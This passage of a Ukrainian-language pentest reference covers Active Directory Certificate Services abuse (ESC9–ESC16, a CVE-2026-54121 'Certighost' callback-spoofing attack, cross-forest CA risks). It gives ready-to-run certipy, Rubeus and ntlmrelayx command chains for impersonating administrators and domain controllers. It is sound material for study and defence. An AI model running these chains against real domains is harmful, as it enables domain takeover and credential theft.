Спочатку хеш `Jane` отримується за допомогою Shadow Credentials завдяки `GenericWrite`, яким володіє `John`:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Згодом `userPrincipalName` користувача `Jane` змінюється на `Administrator`, навмисно без доменної частини `@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Ця модифікація не порушує обмежень, оскільки `Administrator@corp.local` залишається окремим `userPrincipalName` користувача `Administrator`.

Після цього вразливий шаблон сертифіката `ESC9` запитується від імені `Jane`:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Зазначено, що `userPrincipalName` сертифіката відповідає `Administrator` і не містить жодного “object SID”.

Потім `userPrincipalName` `Jane` повертається до початкового значення `Jane@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Спроба автентифікації за допомогою виданого сертифіката тепер повертає NT-хеш `Administrator@corp.local`. Команда має містити `-domain <domain>` через відсутність у сертифікаті зазначення домену:
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
## Слабкі зіставлення сертифікатів - ESC10

### Пояснення

Два значення ключів реєстру на контролері домену, на які посилається ESC10:

- Значення за замовчуванням для `CertificateMappingMethods` у `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` дорівнює `0x18` (`0x8 | 0x10`), тоді як раніше воно було `0x1F`.
- Налаштування за замовчуванням для `StrongCertificateBindingEnforcement` у `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` дорівнює `1`, тоді як раніше воно було `0`.<sup>[[7]](#references)</sup>

**Випадок 1**

Коли `StrongCertificateBindingEnforcement` налаштовано як `0`.

**Випадок 2**

Якщо `CertificateMappingMethods` містить біт `UPN` (`0x4`).

### Сценарій зловживання 1

Якщо `StrongCertificateBindingEnforcement` налаштовано як `0`, обліковий запис A із дозволами `GenericWrite` можна використати для компрометації будь-якого облікового запису B.

Наприклад, маючи дозволи `GenericWrite` для `Jane@corp.local`, зловмисник прагне скомпрометувати `Administrator@corp.local`. Процедура аналогічна ESC9, що дозволяє використовувати будь-який certificate template.

Спочатку хеш `Jane` отримується за допомогою Shadow Credentials, використовуючи `GenericWrite`.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Згодом `userPrincipalName` облікового запису `Jane` змінюється на `Administrator`, навмисно без частини `@corp.local`, щоб уникнути порушення обмеження.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Після цього запитується сертифікат, що дає змогу автентифікацію клієнта, як `Jane`, із використанням стандартного шаблону `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`userPrincipalName` користувача `Jane` потім повертається до початкового значення — `Jane@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Аутентифікація за допомогою отриманого сертифіката надасть NT-хеш `Administrator@corp.local`, тому в команді потрібно вказати домен, оскільки в сертифікаті відсутні відомості про домен.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Сценарій зловживання 2

Якщо `CertificateMappingMethods` містить бітовий прапорець `UPN` (`0x4`), обліковий запис A із дозволами `GenericWrite` може скомпрометувати будь-який обліковий запис B, у якого відсутня властивість `userPrincipalName`, зокрема облікові записи машин і вбудований доменний адміністратор `Administrator`.

У цьому випадку мета полягає в компрометації `DC$@corp.local`, починаючи з отримання хешу `Jane` через Shadow Credentials із використанням `GenericWrite`.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`userPrincipalName` користувачки `Jane` потім встановлюється як `DC$@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
Сертифікат для автентифікації клієнта запитується як `Jane` за допомогою стандартного шаблону `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`userPrincipalName` `Jane` повертається до початкового значення після цього процесу.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Для автентифікації через Schannel використовується опція `-ldap-shell` інструмента Certipy, що свідчить про успішну автентифікацію як `u:CORP\DC$`.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
За допомогою LDAP shell такі команди, як `set_rbcd`, дають змогу виконувати атаки Resource-Based Constrained Delegation (RBCD), потенційно компрометуючи контролер домену.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Ця вразливість також поширюється на будь-який обліковий запис користувача, якому бракує `userPrincipalName` або значення якого не збігається з `sAMAccountName`. Обліковий запис `Administrator@corp.local` є основною ціллю через його розширені LDAP-привілеї та відсутність `userPrincipalName` за замовчуванням.

## Relaying NTLM to ICPR - ESC11

### Пояснення

Якщо CA Server не налаштовано з параметром `IF_ENFORCEENCRYPTICERTREQUEST`, через службу RPC можна виконувати NTLM relay-атаки без підпису. [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).<sup>[[10]](#references)</sup>

За допомогою `certipy` можна перевірити, чи вимкнено `Enforce Encryption for Requests`; `certipy` покаже вразливості `ESC11`.
```bash
$ certipy find -u <user>@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Сценарій зловживання

Потрібно налаштувати relay server:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
Примітка: Для контролерів домену потрібно вказати `-template` у DomainController.

Або використовуючи [fork impacket від sploutchy](https://github.com/sploutchy/impacket):
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Shell access до ADCS CA з YubiHSM - ESC12

### Пояснення

Адміністратори можуть налаштувати Certificate Authority для зберігання ключа на зовнішньому пристрої, наприклад на "Yubico YubiHSM2".

Якщо USB-пристрій підключено до сервера CA через USB-порт або через USB device server, якщо сервер CA є віртуальною машиною, для Key Storage Provider потрібен ключ автентифікації (іноді його називають "паролем"), щоб генерувати ключі в YubiHSM і використовувати їх.

Цей ключ/пароль зберігається в реєстрі за адресою `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` у відкритому вигляді.

Посилання наведено [тут](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).<sup>[[11]](#references)</sup>

### Сценарій експлуатації

Якщо приватний ключ CA зберігається на фізичному USB-пристрої, після отримання shell access можна відновити цей ключ.

Спочатку потрібно отримати сертифікат CA (він є публічним), а потім:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
Нарешті, використайте команду `certutil -sign`, щоб підробити новий довільний сертифікат за допомогою сертифіката CA та його приватного ключа.

## OID Group Link Abuse - ESC13

### Пояснення

Атрибут `msPKI-Certificate-Policy` дає змогу додати політику видачі до шаблону сертифіката. Об'єкти `msPKI-Enterprise-Oid`, відповідальні за видачу політик, можна знайти в Configuration Naming Context (`CN=OID,CN=Public Key Services,CN=Services`) контейнера PKI OID. Політику можна пов'язати з групою AD за допомогою атрибута `msDS-OIDToGroupLink` цього об'єкта, що дає змогу системі авторизувати користувача, який пред'являє сертифікат, так, ніби він є членом цієї групи. [Reference in here](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).<sup>[[12]](#references)</sup>

Іншими словами, коли користувач має дозвіл на реєстрацію сертифіката, а сертифікат пов'язаний із групою OID, користувач може успадкувати привілеї цієї групи.

Використайте [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1), щоб знайти OIDToGroupLink:
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Сценарій зловживання

Знайдіть дозвіл користувача за допомогою `certipy find` або `Certify.exe find /showAllPermissions`.

Якщо `John` має дозвіл на реєстрацію у `VulnerableTemplate`, користувач може успадкувати привілеї групи `VulnerableGroup`.

Потрібно лише вказати шаблон — користувач отримає сертифікат із правами `OIDToGroupLink`.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Вразлива конфігурація поновлення сертифіката — ESC14

### Пояснення

Опис за адресою https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping є надзвичайно докладним. Нижче наведено цитату з оригінального тексту.<sup>[[14]](#references)</sup>

ESC14 стосується вразливостей, що виникають через «слабке явне зіставлення сертифікатів», передусім унаслідок неправильного використання або небезпечної конфігурації атрибута `altSecurityIdentities` облікових записів користувачів або комп’ютерів Active Directory. Цей багатозначний атрибут дає адміністраторам змогу вручну пов’язувати сертифікати X.509 з обліковим записом AD для автентифікації. Якщо цей атрибут заповнено, такі явні зіставлення можуть замінити стандартну логіку зіставлення сертифікатів, яка зазвичай покладається на UPN або DNS-імена в SAN сертифіката чи на SID, вбудований у розширення безпеки `szOID_NTDS_CA_SECURITY_EXT`.

«Слабке» зіставлення виникає, коли рядкове значення, що використовується в атрибуті `altSecurityIdentities` для ідентифікації сертифіката, є надто широким, легко вгадуваним, спирається на неунікальні поля сертифіката або використовує компоненти сертифіката, які легко підробити. Якщо зловмисник може отримати або створити сертифікат, атрибути якого відповідають такому слабко визначеному явному зіставленню привілейованого облікового запису, він може використати цей сертифікат для автентифікації від імені цього облікового запису та його імперсонації.

Приклади потенційно слабких рядків зіставлення `altSecurityIdentities`:

- Зіставлення лише за поширеним загальним іменем (CN) суб’єкта: наприклад, `X509:<S>CN=SomeUser`. Зловмисник може отримати сертифікат із цим CN із менш захищеного джерела.
- Використання надто загальних розрізнювальних імен (DN) видавця або суб’єкта без додаткової кваліфікації, як-от конкретного серійного номера чи ідентифікатора ключа суб’єкта: наприклад, `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Використання інших передбачуваних шаблонів або некриптографічних ідентифікаторів, яким зловмисник може відповідати у сертифікаті, що його можна легітимно отримати або підробити (якщо він скомпрометував CA або виявив вразливий шаблон, як у ESC1).

Атрибут `altSecurityIdentities` підтримує різні формати зіставлення, зокрема:

- `X509:<I>IssuerDN<S>SubjectDN` (зіставлення за повними DN видавця та суб’єкта)
- `X509:<SKI>SubjectKeyIdentifier` (зіставлення за значенням розширення Subject Key Identifier сертифіката)
- `X509:<SR>SerialNumberBackedByIssuerDN` (зіставлення за серійним номером, який неявно кваліфікується DN видавця) — це не стандартний формат, зазвичай використовується `<I>IssuerDN<SR>SerialNumber`.
- `X509:<RFC822>EmailAddress` (зіставлення за іменем RFC822, зазвичай адресою електронної пошти, із SAN)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (зіставлення за SHA1-хешем необробленого відкритого ключа сертифіката — загалом надійний варіант)

Безпека цих зіставлень значною мірою залежить від конкретності, унікальності та криптографічної стійкості вибраних ідентифікаторів сертифіката, що використовуються в рядку зіставлення. Навіть за ввімкнених на Domain Controllers режимів посиленого прив’язування сертифікатів (які переважно впливають на неявні зіставлення за SAN UPN/DNS і розширенням SID) неправильно налаштований запис `altSecurityIdentities` усе одно може створювати прямий шлях до імперсонації, якщо сама логіка зіставлення є хибною або надто дозвільною.

### Сценарій зловживання

ESC14 спрямований на **явні зіставлення сертифікатів** в Active Directory (AD), зокрема на атрибут `altSecurityIdentities`. Якщо цей атрибут задано (навмисно або через помилкову конфігурацію), зловмисники можуть імперсонувати облікові записи, надаючи сертифікати, що відповідають зіставленню.

#### Сценарій A: Зловмисник може записувати до `altSecurityIdentities`

**Попередня умова**: зловмисник має дозволи на запис до атрибута `altSecurityIdentities` цільового облікового запису або дозвіл надати такі права у формі одного з наведених нижче дозволів на цільовий об’єкт AD:
- Write property `altSecurityIdentities`
- Write property `Public-Information`
- Write property (all)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*.
#### Сценарій B: Ціль має слабке зіставлення через X509RFC822 (Email)

- **Попередня умова**: ціль має слабке зіставлення X509RFC822 в altSecurityIdentities. Зловмисник може встановити атрибут mail жертви так, щоб він відповідав імені X509RFC822 цілі, отримати сертифікат від імені жертви та використати його для автентифікації як ціль.

#### Сценарій C: Ціль має зіставлення X509IssuerSubject

- **Попередня умова**: ціль має слабке явне зіставлення X509IssuerSubject в `altSecurityIdentities`.Зловмисник може встановити атрибут `cn` або `dNSHostName` принципала-жертви так, щоб він відповідав суб’єкту зіставлення X509IssuerSubject цілі. Потім зловмисник може отримати сертифікат від імені жертви та використати його для автентифікації як ціль.

#### Сценарій D: Ціль має зіставлення X509SubjectOnly

- **Попередня умова**: ціль має слабке явне зіставлення X509SubjectOnly в `altSecurityIdentities`. Зловмисник може встановити атрибут `cn` або `dNSHostName` принципала-жертви так, щоб він відповідав суб’єкту зіставлення X509SubjectOnly цілі. Потім зловмисник може отримати сертифікат від імені жертви та використати його для автентифікації як ціль.
### практичні операції
#### Сценарій A

Запросіть сертифікат за шаблоном сертифіката `Machine`
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
Збережіть і перетворіть сертифікат
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
Автентифікація (за допомогою сертифіката)
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
Очищення (необов’язково)
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
Для більш конкретних методів атак у різних сценаріях атак див. [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).<sup>[[13]](#references)</sup>

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### Пояснення

Опис за адресою https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc є надзвичайно докладним. Нижче наведено цитату з оригінального тексту.<sup>[[15]](#references)</sup>

Використовуючи вбудовані стандартні шаблони сертифікатів версії 1, зловмисник може створити CSR, включивши до нього application policies, які мають пріоритет над налаштованими атрибутами Extended Key Usage, зазначеними в шаблоні. Єдина вимога — права на enrollment; це можна використати для створення сертифікатів client authentication, certificate request agent і codesigning за допомогою шаблону **_WebServer_**

### Експлуатація

Документація [Certipy privilege-escalation](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu) містить докладніші приклади використання.<sup>[[14]](#references)</sup>


Команда `find` у Certipy допоможе виявити шаблони V1, які потенційно вразливі до ESC15, якщо CA не пропатчено.
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### Сценарій A: Пряма імперсонація через Schannel

**Крок 1: Запросити сертифікат, додавши політику застосунку "Client Authentication" і цільовий UPN.** Зловмисник `attacker@corp.local` націлюється на `administrator@corp.local`, використовуючи шаблон V1 "WebServer" (який дозволяє суб’єкту, наданому enrollee).
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: Вразливий шаблон V1 із параметром "Enrollee supplies subject".
- `-application-policies 'Client Authentication'`: Додає OID `1.3.6.1.5.5.7.3.2` до розширення Application Policies у CSR.
- `-upn 'administrator@corp.local'`: Встановлює UPN у SAN для імперсонації.

**Крок 2: Автентифікація через Schannel (LDAPS) за допомогою отриманого сертифіката.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### Сценарій B: PKINIT/Kerberos Impersonation через зловживання Enrollment Agent

**Крок 1: Запросити сертифікат із шаблону V1 (із параметром "Enrollee supplies subject"), додавши Application Policy "Certificate Request Agent".** Цей сертифікат призначений для attacker (`attacker@corp.local`), щоб стати enrollment agent. Для власної ідентичності attacker UPN не вказується, оскільки метою є отримання можливості діяти як agent.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: Injects OID `1.3.6.1.4.1.311.20.2.1`.

**Крок 2: Використайте сертифікат "agent", щоб запросити сертифікат від імені цільового привілейованого користувача.** Це крок, подібний до ESC3, у якому сертифікат із Кроку 1 використовується як сертифікат agent.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**Крок 3: Автентифікуйтеся як привілейований користувач за допомогою сертифіката "on-behalf-of".**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## Security Extension Disabled on CA (Globally)-ESC16

### Пояснення

**ESC16 (Elevation of Privilege via Missing szOID_NTDS_CA_SECURITY_EXT Extension)** — це сценарій, за якого, якщо конфігурація AD CS не вимагає включення розширення **szOID_NTDS_CA_SECURITY_EXT** до всіх сертифікатів, зловмисник може скористатися цим, щоб:

1. Запросити сертифікат **без прив’язки до SID**.

2. Використати цей сертифікат **для автентифікації як будь-який обліковий запис**, наприклад видаючи себе за обліковий запис із високими привілеями (наприклад, Domain Administrator).

Також можна звернутися до цієї статті, щоб дізнатися більше про детальний принцип:https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6<sup>[[16]](#references)</sup>

### Експлуатація

Наведена нижче інформація взята з [цього посилання](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally), натисніть, щоб переглянути детальніші способи використання.<sup>[[14]](#references)</sup>

Щоб визначити, чи є середовище Active Directory Certificate Services (AD CS) вразливим до **ESC16**
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**Крок 1: Прочитати початковий UPN облікового запису жертви (необов’язково — для відновлення).**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**Крок 2: Оновіть UPN облікового запису жертви до `sAMAccountName` цільового адміністратора.
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**Крок 3: (за потреби) Отримайте облікові дані облікового запису "жертви" (наприклад, за допомогою Shadow Credentials).**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**Крок 4: Запросіть сертифікат як користувач _"victim"_ із _будь-якого придатного шаблону автентифікації клієнта_ (наприклад, "User") на вразливому до ESC16 CA.** Оскільки CA вразливий до ESC16, він автоматично вилучить розширення безпеки SID із виданого сертифіката, незалежно від конкретних налаштувань цього розширення в шаблоні. Установіть змінну середовища для кешу облікових даних Kerberos (команда shell):
```bash
export KRB5CCNAME=victim.ccache
```
Потім запросіть сертифікат:
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**Крок 5: Поверніть UPN облікового запису «жертви».**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**Крок 6: Автентифікуйтеся як цільовий адміністратор.**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## Підміна ідентичності через callback chase у Rogue LDAP/LSA (Certighost / CVE-2026-54121)

### Пояснення

**Certighost** зловживає **AD CS enrollment chase / callback path**, у якому CA довіряє атрибутам запиту, наданим запитувачем, під час визначення ідентичності, яку слід помістити у виданий сертифікат. У публічному PoC створений запит містить:<sup>[[1]](#references)[[2]](#references)</sup>

- **`cdc`**: хост/IP під контролем атакувальника, до якого CA підключатиметься
- **`rmd`**: **DNS-ім’я цільового Domain Controller**, який потрібно імплементувати

Якщо CA виконує цей chase, він підключиться до атакувальника через **SMB/LSA (`445`)** і **LDAP (`389`)**. Атакувальник використовує **реальний обліковий запис комп’ютера** (зазвичай створений завдяки стандартному значенню **`ms-DS-MachineAccountQuota`**), щоб callback-сесія автентифікувалася як дійсний суб’єкт домену, але шахрайські служби натомість повертають атрибути ідентичності **цільового DC**:

- `sAMAccountName`
- `objectSid` / SID
- `dNSHostName`

Якщо CA **криптографічно не прив’язує повернену ідентичність до автентифікованого callback-суб’єкта**, він може видати сертифікат для **Domain Controller**, хоча сесія автентифікувалася як обліковий запис комп’ютера під контролем атакувальника. Концептуально це відрізняє помилку від **Certifried**: замість перезапису атрибутів AD, таких як `dNSHostName`, атакувальник **підміняє дані ідентичності під час callback resolution у CA**.<sup>[[2]](#references)</sup>

**Необхідні умови:**

- Облікові дані **домену** з низькими привілеями
- Можливість **створити або повторно використати обліковий запис комп’ютера**
- Мережева доступність із **CA** до контрольованих атакувальником **портів `389` і `445`**
- Вразливий / невиправлений шлях обробки запитів CA (оновлення Microsoft від **14 липня 2026 року** додало **перевірку DC для `cdc`** і **порівняння визначених SID**)

Отриманий **`.pfx`** можна використовувати для **PKINIT**, створюючи **`.ccache`** і, згідно з опублікованим PoC flow, **NT-хеш цільового DC**, чого зазвичай достатньо для **повного контролю над доменом**.

### Експлуатація

Публічний PoC автоматизує весь ланцюг:<sup>[[1]](#references)</sup>

1. Створити або повторно використати **обліковий запис комп’ютера** під контролем атакувальника.
2. Запустити **шахрайські LDAP- і SMB/LSA-listener-и** на `389` і `445`.
3. Надіслати запит на сертифікат, що містить контрольовані атакувальником атрибути **`cdc`** і цільовий **`rmd`**.
4. Дозволити CA автентифікуватися на шахрайських listener-ах як контрольований обліковий запис комп’ютера, але відповідати на запити ідентичності атрибутами **цільового DC**.
5. Отримати підписаний CA **сертифікат DC**, а потім використати його для **PKINIT**.
```bash
sudo python3 certighost.py -d playground.local -u lowpriv -p 'Password1234' --dc-ip 192.168.1.10
```
Корисні runtime flags із PoC:

- `--listener <ip>`: явно вибрати IP для callback, що рекламується в `cdc`
- `--computer-name <NAME$>`: повторно використати наявний обліковий запис комп’ютера замість створення нового

**Операційні примітки:**

- PoC потребує **root**, оскільки здійснюється прив’язка до **привілейованих портів** `389` і `445`.
- У разі успішної експлуатації локально записуються **DC `.pfx`** і **Kerberos `.ccache`**.
- Оскільки сертифікат зіставляється з **обліковим записом контролера домену**, подальші дії можуть включати **Kerberos-аутентифікацію на основі сертифіката**, **DCSync** і повторне використання отриманого **NT-хешу машинного облікового запису**.<sup>[[2]](#references)</sup>

## Компрометація лісів за допомогою сертифікатів у пасивному стані

### Порушення довірчих відносин між лісами через скомпрометовані CA

Конфігурація для **міжлісової реєстрації** налаштовується відносно просто. **Сертифікат кореневого CA** з ресурсного лісу **публікується адміністраторами в облікових лісах**, а сертифікати **enterprise CA** з ресурсного лісу **додаються до контейнерів `NTAuthCertificates` і AIA у кожному обліковому лісі**. Для уточнення, така схема надає **CA у ресурсному лісі повний контроль** над усіма іншими лісами, для яких ним керується PKI. Якщо цей CA буде **скомпрометований зловмисниками**, сертифікати для всіх користувачів як ресурсного, так і облікових лісів можуть бути **підроблені ними**, що порушує межу безпеки лісу.<sup>[[6]](#references)</sup>

### Надання привілеїв на реєстрацію зовнішнім принципалам

У середовищах із кількома лісами необхідно проявляти обережність щодо Enterprise CA, які **публікують шаблони сертифікатів**, що надають **Authenticated Users або зовнішнім принципалам** (користувачам/групам за межами лісу, якому належить Enterprise CA) **права на реєстрацію та редагування**.\
Після автентифікації через trust AD додає **SID Authenticated Users** до токена користувача. Отже, якщо домен має Enterprise CA із шаблоном, який **надає Authenticated Users права на реєстрацію**, користувач з іншого лісу потенційно може **зареєструватися за цим шаблоном**. Аналогічно, якщо **права на реєстрацію явно надані зовнішньому принципалу шаблоном**, таким чином створюється **міжлісовий зв’язок контролю доступу**, що дає принципалу з одного лісу змогу **зареєструватися за шаблоном з іншого лісу**.

Обидва сценарії призводять до **розширення поверхні атаки** з одного лісу на інший. Налаштування шаблону сертифіката може бути використано зловмисником для отримання додаткових привілеїв у зовнішньому домені.<sup>[[6]](#references)</sup>


## References

- [1] [aniqfakhrul/CVE-2026-54121 репозиторій PoC](https://github.com/aniqfakhrul/CVE-2026-54121)
- [2] [H0j3n - технічний аналіз Certighost](https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26)
- [3] [Certify 2.0 – блог SpecterOps](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [5] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [6] [SpecterOps – Certified Pre-Owned: зловживання Active Directory Certificate Services](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [7] [Oliver Lyak – Certipy 4.0: ESC9, ESC10, графічний інтерфейс BloodHound, нові методи автентифікації та запитів і багато іншого](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [8] [SpecterOps – Shadow Credentials: зловживання зіставленням облікових записів через Key Trust для захоплення облікового запису](https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/)
- [9] [CQure Academy – Історія розширеного (не)використання ключів](https://cqureacademy.com/blog/enhanced-key-usage)
- [10] [Compass Security – Relay до AD Certificate Services через RPC](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)
- [11] [hajo – ESC12: доступ до shell ADCS CA за допомогою YubiHSM](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)
- [12] [SpecterOps – техніка зловживання ADCS ESC13](https://specterops.io/blog/2024/02/14/adcs-esc13-abuse-technique/)
- [13] [SpecterOps – техніка зловживання ADCS ESC14](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [14] [Certipy Wiki – підвищення привілеїв (ESC1-ESC17)](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
- [15] [TrustedSec – EKUwu: не просто ще один AD CS ESC](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [16] [Furious5 – AD CS ESC16: неправильна конфігурація та експлуатація](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6)
{{#include ../../../banners/hacktricks-training.md}}
